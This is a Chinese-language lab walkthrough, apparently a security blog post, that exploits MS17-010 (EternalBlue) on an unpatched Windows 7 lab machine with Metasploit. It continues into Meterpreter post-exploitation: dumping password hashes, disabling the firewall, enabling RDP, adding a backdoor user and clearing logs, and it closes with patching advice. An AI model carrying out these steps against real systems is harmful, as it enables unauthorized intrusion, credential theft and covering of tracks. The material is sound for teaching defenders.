## 前言：

提到操作系统漏洞，大家肯定听说过耳熟能详的永恒之蓝（MS17-010）了，他的爆发源于WannaCry勒索病毒的诞生。  
该病毒是不法分子利用NSA（National Security Agency，美国国家安全局）泄露的危险漏洞“EternalBlue”（永恒之蓝）进行传播
。勒索病毒肆虐，俨然是一场全球性互联网灾难，给广大电脑用户造成了巨大损失。最新统计数据显示，100多个国家和地区超过10万台电脑遭到了勒索病毒攻击、感染。
勒索病毒是自熊猫烧香以来影响力最大的病毒之一。

## 实验环境：

工具：metasploit

靶机两台：windows 7sp1和kali2020

攻击机IP地址：192.168.29.131

被攻击机IP地址：192.168.29.128

实验条件：两台机子可以互通的，并且windows 7sp1（无补丁）开启了445端口，防火墙是关闭的。

### 步骤：

 **1、在kali里面打开metasploit漏洞利用框架**

![1621857379_60ab9463ea0a58eaecc55.png!small?1621857380830](https://image.3001.net/images/20210524/1621857379_60ab9463ea0a58eaecc55.png!small?1621857380830)

 **2、搜索ms17-010漏洞利用模块 search 17-010**

![1621857394_60ab94729d4ed66009900.png!small?1621857395111](https://image.3001.net/images/20210524/1621857394_60ab94729d4ed66009900.png!small?1621857395111)

找到exploit/windows/smb/ms17_010_eternalblue

其中exploit具有攻击性，auxliary是用来验证的。

 **3、使用利用模块use+exploit/windows/smb/ms17_010_eternalblue**

![1621857418_60ab948a7ff4692c8d848.png!small?1621857418850](https://image.3001.net/images/20210524/1621857418_60ab948a7ff4692c8d848.png!small?1621857418850)

 **4、查看配置项 show options**

![1621857455_60ab94afab18677a17543.png!small?1621857456093](https://image.3001.net/images/20210524/1621857455_60ab94afab18677a17543.png!small?1621857456093)

 **5、设置 靶机IP地址（RHOST），攻击机IP地址（LHOST）**

![1621857483_60ab94cb67fde42b97e70.png!small?1621857483927](https://image.3001.net/images/20210524/1621857483_60ab94cb67fde42b97e70.png!small?1621857483927)

![1621857491_60ab94d3b7127cc905bc4.png!small?1621857492016](https://image.3001.net/images/20210524/1621857491_60ab94d3b7127cc905bc4.png!small?1621857492016)

再次查看配置项

![1621857510_60ab94e67a66f055bd857.png!small?1621857510981](https://image.3001.net/images/20210524/1621857510_60ab94e67a66f055bd857.png!small?1621857510981)

 **6、实施攻击exploit/run**

![1621857527_60ab94f77df2d8031c2f6.png!small?1621857528164](https://image.3001.net/images/20210524/1621857527_60ab94f77df2d8031c2f6.png!small?1621857528164)

 **7、攻入目标主机**

![1621857540_60ab95046bdd17c03fd03.png!small?1621857540656](https://image.3001.net/images/20210524/1621857540_60ab95046bdd17c03fd03.png!small?1621857540656)

 **Meterpreter 是 Metasploit 的一个扩展模块，可以调用 Metasploit 的一些功能，  
对目标系统进行更深入的渗透，如获取屏幕、上传/下载文件、创建持久后门等。**

##  **在攻击进去的情况下演示几个功能**

1、 **查看目标主机的操作系统信息（sysinfo）**

![1621857564_60ab951cbbb8f17aadcda.png!small?1621857565129](https://image.3001.net/images/20210524/1621857564_60ab951cbbb8f17aadcda.png!small?1621857565129)

 **2、对目标主机的屏幕进行截图（截图保存在/root下）**

![1621857579_60ab952bc4065de1be0e2.png!small?1621857580694](https://image.3001.net/images/20210524/1621857579_60ab952bc4065de1be0e2.png!small?1621857580694)

 **3、查看目标主机所有的用户名和密码（密码显示为hash值）**

![1621857590_60ab9536b96095f603c4e.png!small?1621857591179](https://image.3001.net/images/20210524/1621857590_60ab9536b96095f603c4e.png!small?1621857591179)

4 **、** 获取shell页面

![1621857604_60ab954493bf3b83b307d.png!small?1621857604863](https://image.3001.net/images/20210524/1621857604_60ab954493bf3b83b307d.png!small?1621857604863)

乱码解决方法：

输入chcp 65001可将乱码解决

![1621857619_60ab9553770f7985db9df.png!small?1621857620018](https://image.3001.net/images/20210524/1621857619_60ab9553770f7985db9df.png!small?1621857620018)

 **5、关闭防火墙**

![1621857630_60ab955e80c46f8aaefa0.png!small?1621857630872](https://image.3001.net/images/20210524/1621857630_60ab955e80c46f8aaefa0.png!small?1621857630872)

 **6、关闭Telnet服务**

![1621857639_60ab956705eac3e79408a.png!small?1621857639471](https://image.3001.net/images/20210524/1621857639_60ab956705eac3e79408a.png!small?1621857639471)

 **7、用两种方法开启远程桌面服务，并查看远程桌面功能启用情况**

 **（** **1** **）方法** **1：** **run** **getgui -e**

![1621857654_60ab957695824b1265dc3.png!small?1621857654934](https://image.3001.net/images/20210524/1621857654_60ab957695824b1265dc3.png!small?1621857654934)

 **（2）** **方法** **2：** **run** **post/windows/manage/enable_rdp**

![1621857667_60ab9583d7ef83caa31d3.png!small?1621857668146](https://image.3001.net/images/20210524/1621857667_60ab9583d7ef83caa31d3.png!small?1621857668146)

 **到windows7sp1上查看远程桌面功能启用情况**

![1621857677_60ab958d952557347f6da.png!small?1621857678076](https://image.3001.net/images/20210524/1621857677_60ab958d952557347f6da.png!small?1621857678076)

 **8、创建系统用户（创建用户名为：test，密码为：123456）**

![1621857699_60ab95a3603699f85757e.png!small?1621857699703](https://image.3001.net/images/20210524/1621857699_60ab95a3603699f85757e.png!small?1621857699703)

 **9、清除日志**

![1621857711_60ab95afbbc3a84c7828d.png!small?1621857712380](https://image.3001.net/images/20210524/1621857711_60ab95afbbc3a84c7828d.png!small?1621857712380)

# 修复方案

关闭445端口。

打开防火墙，安装安全软件。

安装对应补丁。

# 总结

为了维持操作系统的安全，我们能做到的是及时更新，安装补丁，关闭不必要的服务和端口。

